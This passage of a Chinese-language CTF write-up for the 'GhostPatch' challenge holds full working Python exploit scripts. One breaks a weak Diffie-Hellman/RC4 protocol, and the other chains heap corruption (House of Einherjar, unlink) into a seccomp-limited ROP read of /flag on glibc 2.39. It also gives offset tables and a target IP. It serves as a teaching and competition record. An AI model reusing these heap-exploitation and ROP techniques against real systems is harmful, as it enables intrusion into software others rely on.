- `fgt.py` —— FGT/1.0 传输层客户端（握手 / Pohlig-Hellman 无关的会话密钥派生 / RC4 帧收发 / console 封装）
- `exp.py` —— 完整利用脚本（连接靶机一条命令出 flag）

### 4.1 `fgt.py`（传输层客户端）

```python
# -*- coding: utf-8 -*-
import socket, hashlib, struct, time, sys

HOST = "60.205.176.201"
PORT = 22784

def rc4_init(key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]
    return S, 0, 0

def rc4_crypt(state, data):
    S, i, j = state
    out = bytearray(len(data))
    for k, c in enumerate(data):
        i = (i + 1) & 0xff
        j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        out[k] = c ^ S[(S[i] + S[j]) & 0xff]
    return (S, i, j), bytes(out)

class FGT:
    def __init__(self, host=HOST, port=PORT):
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.settimeout(10)
        self.rbuf = b""
        line = self.readline()
        assert line.startswith(b"FGT/1.0 READY"), line
        parts = line.split()
        p = int(parts[2].split(b"=")[1], 16)
        g = int(parts[3].split(b"=")[1], 10)
        a = 0x1234567890ab % p
        A = pow(g, a, p)
        self.s.sendall(b"FGT/1.0 HELLO %x\n" % A)
        line = self.readline()
        assert line.startswith(b"FGT/1.0 OK"), line
        B = int(line.split()[2], 16)
        shared = pow(B, a, p)
        K = hashlib.sha256(shared.to_bytes(6, "big")).digest()[:16]
        self.tx = rc4_init(K)   # client->server stream
        self.rx = rc4_init(K)   # server->client stream
        self.files = self.list()

    def readline(self):
        while b"\n" not in self.rbuf:
            d = self.s.recv(4096)
            if not d: raise EOFError("closed")
            self.rbuf += d
        line, self.rbuf = self.rbuf.split(b"\n", 1)
        return line + b"\n"

    def send_frame(self, ftype, payload=b""):
        frame = bytes([ftype]) + payload
        self.tx, enc = rc4_crypt(self.tx, frame)
        self.s.sendall(struct.pack(">H", len(frame)) + enc)

    def _recv_exact(self, n):
        while len(self.rbuf) < n:
            d = self.s.recv(65536)
            if not d: raise EOFError("closed")
            self.rbuf += d
        out, self.rbuf = self.rbuf[:n], self.rbuf[n:]
        return out

    def recv_frame(self):
        hdr = self._recv_exact(2)
        ln = struct.unpack(">H", hdr)[0]
        if ln == 0: return (0, b"")
        enc = self._recv_exact(ln)
        self.rx, dec = rc4_crypt(self.rx, enc)
        return (dec[0], dec[1:])

    def list(self):
        self.send_frame(6)
        t, p = self.recv_frame()
        if t != 6: return None
        cnt = struct.unpack(">H", p[:2])[0]; o = 2; names = []
        for _ in range(cnt):
            nl = struct.unpack(">H", p[o:o+2])[0]; o += 2
            names.append(p[o:o+nl].decode()); o += nl
        return names

    def shell(self):
        self.send_frame(7)
        while True:
            t, p = self.recv_frame()
            if t == 8: break

    def cin(self, data):
        if isinstance(data, str): data = data.encode()
        self.send_frame(9, struct.pack(">I", len(data)) + data)

    def drain(self, idle=0.35, maxt=3.0):
        out = []; t0 = time.time(); last = time.time()
        self.s.settimeout(idle)
        while time.time() - t0 < maxt:
            try:
                f = self.recv_frame()
            except socket.timeout:
                if time.time() - last > idle: break
                continue
            except EOFError:
                break
            out.append(f); last = time.time()
        self.s.settimeout(10)
        return out

    @staticmethod
    def frames_to_bytes(frames):
        buf = b""
        for t, p in frames:
            if t == 10:
                buf += p[4:4+struct.unpack(">I", p[:4])[0]]
            elif t == 8:
                buf += b"[OKSH]"
            elif t == 5:
                buf += b"[ERR %d]" % (p[0] if p else -1)
        return buf

    def console(self, data, idle=0.35):
        self.cin(data)
        return self.frames_to_bytes(self.drain(idle))

    def close(self):
        try: self.s.close()
        except Exception: pass
```

### 4.2 `exp.py`（完整利用）

```python
# -*- coding: utf-8 -*-
"""GhostPatch full exploit: FGT/1.0 -> patchd 2.4.1-debug heap -> seccomp ROP -> /flag"""
import sys, re, time, struct
from pwn import p64, u64
from fgt import FGT

HOST = "60.205.176.201"
PORT = 22784

# ---- libc offsets (verified against provided libc.so.6) ----
LIBC_UNSORTED   = 0x203b20      # main_arena + 0x60
ENVIRON         = 0x20ad58
RET_AFTER_MAIN  = 0x2a1ca       # __libc_start_call_main, right after `call rax` (main)
G_POP_RDI       = 0x10c08d
G_POP_RSI       = 0x110b7d
G_POP_RDX       = 0xb513c       # pop rdx; xor eax,eax; pop rbx; pop r12; pop r13; pop rbp; ret
G_POP_RAX       = 0xdd337
G_POP_RCX       = 0xa885e
G_MOV_EDI_EAX   = 0x46488       # mov edi,eax; or edi,ecx; mov rax,rdi; ret
G_SYSCALL       = 0x99096

def ok(*a): print("[+]", *a); sys.stdout.flush()

class Exp:
    def __init__(self, host=HOST, port=PORT):
        self.c = FGT(host, port)
        self.c.shell()
        self.c.console(b"\n", 0.6)
        self.slots = [True, False, False, False, False, False, False]  # slot0 = selftest

    def _alloc(self):
        for i, occ in enumerate(self.slots):
            if not occ:
                self.slots[i] = True
                return i
        raise RuntimeError("no free slot")

    def stage(self, size, data):
        assert 0x88 <= size <= 0x418 and len(data) == size
        slot = self._alloc()
        self.c.console(b"1\n")
        out = self.c.console(("%d\n" % size).encode())
        assert b"data: " in out
        self.c.cin(data); self.c.drain(0.3)
        return slot

    def verify(self, slot, n=None):
        self.c.console(b"2\n")
        out = self.c.console(("%d\n" % slot).encode(), 0.5)
        return out[:n] if n is not None else out

    def hotfix(self, slot, off, ln, data):
        self.c.console(b"3\n")
        self.c.console(("%d\n" % slot).encode())
        self.c.console(("%d\n" % off).encode())
        out = self.c.console(("%d\n" % ln).encode())
        assert b"data: " in out
        self.c.cin(data); self.c.drain(0.3)

    def rollback(self, slot):
        self.c.console(b"4\n")
        self.c.console(("%d\n" % slot).encode(), 0.4)
        self.slots[slot] = False

    def set_blobs(self, b1_size, b1_data, b2_size=8, b2_data=0):
        arr = bytearray(0xE8)
        arr[0:8]   = p64(0xF8)
        arr[8:16]  = p64(self.table - 0x10)
        arr[16:24] = p64(b1_size)
        arr[24:32] = p64(b1_data)
        arr[32:40] = p64(b2_size)
        arr[40:48] = p64(b2_data)
        self.hotfix(0, 0x10, 0xE8, bytes(arr))

    def read_any(self, addr, n):
        self.set_blobs(n, addr)
        return self.verify(1, n)

    def write_any(self, addr, data):
        self.set_blobs(8, 0, len(data), addr)
        self.hotfix(2, 0, len(data), data)

    def run(self):
        # 1. leak PIE + table
        out = self.verify(0)
        m = re.search(rb'build=(0x[0-9a-f]+) table=(0x[0-9a-f]+)', out)
        self.pie = int(m.group(1), 16) - 0x1520
        self.table = int(m.group(2), 16)
        ok("pie = %#x   table = %#x" % (self.pie, self.table))

        # 2. fill tcache[46]
        self.rollback(0)
        for i in range(7):
            self.stage(0x2F8, bytes([0x41 + i]) * 0x2F8)
        for i in range(6, -1, -1):
            self.rollback(i)

        # 3. House of Einherjar #1 -> libc
        A_chunk = self.table + 0x1600
        payload = bytearray(0xF8)
        payload[0:8]       = p64(A_chunk)
        payload[8:16]      = p64(A_chunk)
        payload[0xF0:0xF8] = p64(0x100)
        self.stage(0xF8, bytes(payload))
        b1 = bytearray(b"B" * 0x308); b1[0x2F8:0x300] = p64(0x11)
        self.stage(0x308, bytes(b1))
        self.stage(0x108, b"C" * 0x108)
        self.hotfix(0, 0xF8, 0, b"")
        self.rollback(1)
        self.libc = u64(self.verify(0, 8)) - LIBC_UNSORTED
        ok("libc = %#x" % self.libc)

        # 4. drain unsorted + re-arm
        self.stage(0x3F8, b"D" * 0x3F8)
        self.rollback(0)

        # 5. House of Einherjar #2 -> unlink -> arbitrary write
        payload2 = bytearray(0xF8)
        payload2[8:16]      = p64(0xF0)
        payload2[0x10:0x18] = p64(self.table - 0x10)
        payload2[0x18:0x20] = p64(self.table - 8)
        payload2[0xF0:0xF8] = p64(0xF0)
        self.stage(0xF8, bytes(payload2))
        b2 = bytearray(b"B" * 0x308); b2[0x2F8:0x300] = p64(0x11)
        self.stage(0x308, bytes(b2))
        self.stage(0x108, b"C" * 0x108)
        self.hotfix(0, 0xF8, 0, b"")
        self.rollback(3)

        # 6. stack leak / main ret
        stack = u64(self.read_any(self.libc + ENVIRON, 8))
        ok("stack = %#x" % stack)
        data = self.read_any(stack - 0x400, 0x600)
        target = self.libc + RET_AFTER_MAIN
        R = None
        for off in range(0, 0x600, 8):
            if u64(data[off:off + 8]) == target:
                R = stack - 0x400 + off; break
        assert R is not None
        ok("main ret @ %#x" % R)

        # 7. ROP
        flag_addr = R + 0x180; buf_addr = R + 0x1A0; lc = self.libc
        def rdx(v):
            return p64(lc + G_POP_RDX) + p64(v) + p64(0) * 4
        rop  = p64(lc + G_POP_RDI) + p64(0xffffffffffffff9c)
        rop += p64(lc + G_POP_RSI) + p64(flag_addr)
        rop += rdx(0)
        rop += p64(lc + G_POP_RAX) + p64(257)
        rop += p64(lc + G_SYSCALL)
        rop += p64(lc + G_POP_RCX) + p64(0)
        rop += p64(lc + G_MOV_EDI_EAX)
        rop += p64(lc + G_POP_RSI) + p64(buf_addr)
        rop += rdx(0x100)
        rop += p64(lc + G_POP_RAX) + p64(0)
        rop += p64(lc + G_SYSCALL)
        rop += p64(lc + G_POP_RDI) + p64(1)
        rop += p64(lc + G_POP_RSI) + p64(buf_addr)
        rop += rdx(0x100)
        rop += p64(lc + G_POP_RAX) + p64(1)
        rop += p64(lc + G_SYSCALL)
        total = rop + b"\x00" * (0x180 - len(rop)) + b"/flag\x00"
        self.write_any(R, total)

        # 8. trigger
        self.c.console(b"5\n", 0.4)
        self.c.cin(b"x\n")
        buf = self.c.frames_to_bytes(self.c.drain(0.6, 2.0))
        m = re.search(rb'flag\{[^}]*\}', buf)
        if m:
            ok("FLAG: " + m.group().decode())
            return m.group().decode()

if __name__ == "__main__":
    e = Exp()
    try: e.run()
    finally: e.c.close()
```

---

## 5. 踩坑清单（按被坑顺序）

| # | 现象 | 根因 | 解法 |
|---|---|---|---|
| 1 | s2c 解出的帧全是乱码 | 直接按 `-T fields -e tcp.payload` 顺序拼接，**遇到重传就重复/错位** | 用 `tshark -z follow,tcp,raw,2` 做 TCP 重组 |
| 2 | RC4 解出来第一字节是 `0x28` | **握手明文（`READY`/`OK` 两行）混进了密文流** | 以 `FGT/1.0 OK ...\n` 之后为密文起点 |
| 3 | 长度字段异常 | 误以为 `length` 也参与 RC4 | 从密文流里先读**明文** u16 长度，再解 frame |
| 4 | `free(): invalid next size (normal)` | 伪造 `nextchunk->size` 只写了最低字节，高位残留 `'B'` | **8 字节整体写小值**（`p64(0x11)`），且 `>0x10` |
| 5 | seccomp 下只看到 SIGSYS，看不到 glibc 报错 | `__libc_message` 内部触发了被禁 syscall → `KILL_PROCESS` | 把 `call prctl` patch 成 NOP 再调试 |
| 6 | tcache poisoning 完全无效 | `stage` 走 `calloc`，而 **`__libc_calloc` 不查 tcache** | 放弃 tcache，改走 unsorted/unlink |
| 7 | 重叠后写不到 `A` 的 tcache next | 合并 chunk 起始 = fake 位置，fake 放 `A.data` 时新 chunk user 区上移 0x10 | 改用 **unlink 任意写**，或把 fake 放到 chunk 头 |
| 8 | `pop rdx; ret` 找不到 | 该 libc 确实没有 | 用 `pop rdx ; xor eax,eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret`，**之后必须重设 rax** |
| 9 | `read` 读到的是栈数据不是文件 | 硬编码 `fd=3`，但 `openat` 返回的 fd 未必是 3 | 用 `mov edi, eax ; or edi, ecx` gadget 传递真实 fd |
| 10 | 输出里出现 `"/flag"` 字符串却读不到文件 | `p64(0)*(0x180-len(rop))` 是 512 字节不是 64 字节，字符串位置与引用不符 | 改成 `b'\x00' * n` |

### 本次复现额外注意到的点

- **控制台是行式十进制输入**：`getnum` 逐字节读到 `\n` 再 `strtol`；`readn` 严格读满 N 字节。因此在脚本里要**先等 `data: ` 提示出现**再发原始数据，否则会把命令/数字和数据混进同一条输入流。
- **`verify` 输出没有终止分隔符**：原始字节后面直接跟 `"[+] verify done"`，任意读时必须**按已知长度 `[:n]` 截断**，不能按分隔符切。
- **远程靶机按连接分配新进程**：每次连接 ASLR 不同（实测两轮 pie/libc 均变），因此不能缓存泄漏值，每个会话都要重新走一遍泄漏。
- **实例级静态 flag**：两轮独立会话得到同一 flag，说明 `/flag` 是实例级静态文件，而非每连接随机。

---

## 6. 偏移速查表

### 6.1 fw_v2.bin（PIE）

| 符号 | 偏移 |
|---|---|
| `main` | `0x1180` |
| `menu` | `0x1520` |
| `readn` | `0x1420` |
| `getnum` | `0x1470` |
| `blobs`（全局指针） | `0x4140` |
| `tag_buf` | `0x4040` |
| hotfix 越界写 | `0x1731` |

### 6.2 堆（相对 `table`）

| 项 | 偏移 |
|---|---|
| `tcache_perthread_struct` | `-0x2a0` |
| `blobs` chunk | `-0x10` |
| slot0 self-test chunk | `+0x70` |
| 初始 `top` | `+0x100` |
| Einherjar#1 的 `A_chunk` | `+0x1600` |

### 6.3 libc.so.6（Ubuntu 24.04 / glibc 2.39-0ubuntu8.8）

| 名称 | 偏移 |
|---|---|
| `main_arena` | `0x203ac0` |
| `unsorted_chunks` = `main_arena+0x60` | `0x203b20` |
| `environ` | `0x20ad58` |
| `__libc_start_main` | `0x2a200` |
| `__libc_start_call_main`（`call main` 后） | `0x2a1ca` |
| `pop rdi ; ret` | `0x10c08d` |
| `pop rsi ; ret` | `0x110b7d` |
| `pop rdx ; xor eax,eax ; … ; ret` | `0xb513c` |
| `pop rax ; ret` | `0xdd337` |
| `pop rcx ; ret` | `0xa885e` |
| `mov edi,eax ; or edi,ecx ; mov rax,rdi ; ret` | `0x46488` |
| `syscall ; ret` | `0x99096` |

---

## 7. 时间线与心得

整题的设计其实是一条完整的"**取证 → 协议 → 密码 → 逆向 → Pwn**"链，每一环都在为下一环供料：

```
8888 明文通道  →  泄漏 1.0 协议          （取证）
弱 dev modulus →  恢复会话密钥            （密码）
加密信道       →  交付 debug 二进制        （协议）
notes.txt      →  暗示 off-by-one 仍在    （社工/审计误导）
slot0 自检     →  泄漏 PIE + heap         （信息泄漏）
hotfix 边界    →  poison null byte        （漏洞）
```

几个值得记的点：

1. **"dev modulus"这种词就是出题人给的台阶**——只要 `p-1` 光滑，48 bit 的 DH 形同虚设。
2. **关闭调试版二进制里的 seccomp 是排障利器**：否则 glibc 的报错会被 `KILL_PROCESS` 吞掉，只剩一个没有信息的 SIGSYS。
3. **`calloc` 与 `malloc` 在 tcache 上的行为差异**（`__libc_calloc` 不经 tcache）很容易被忽略，直接决定该选 tcache poisoning 还是 unlink。
4. **seccomp 白名单本身就是 exploit 的目标约束**：题目只放行 `openat/read/write`，等于明说"别想着 getshell，老老实实读文件"。
5. `unlink` 的自引用不一定需要"知道堆地址"—— 只要能让 **检查用的两个槽位** 和 **fake chunk 地址** 对齐（本例借 `blobs[0].data` 天然就是 `A2.data`），就能免去堆地址计算。
6. **先取证、再攻击**：调试版二进制只存在于抓包里，还原它才是整条链的起点；而在动态靶机上，协议本身直接可用，无需再走一次解包。

---

## 附录：复现环境与产物

| 项目 | 路径 / 值 |
|---|---|
| 附件 | `C:\Users\81913\Desktop\ghostpatch_59b347d7ba71f9e26493a87161f9baf6.zip` |
| 抓包 | `capture.pcap`（2,678,965 字节） |
| 还原二进制 | `fw_v2.bin` (16520) / `libc.so.6` (2125328) / `ld-linux-x86-64.so.2` (236616) |
| 靶机 | `60.205.176.201:22784` |
| 利用脚本 | `C:\Users\81913\Desktop\ghost_exp\fgt.py`、`exp.py` |
| **Flag** | **`flag{23765d2c-2f6a-468a-86e4-b1a0d167bb7b}`** |

> 本文档仅用于授权范围内的 CTF / 防御性研究复现。
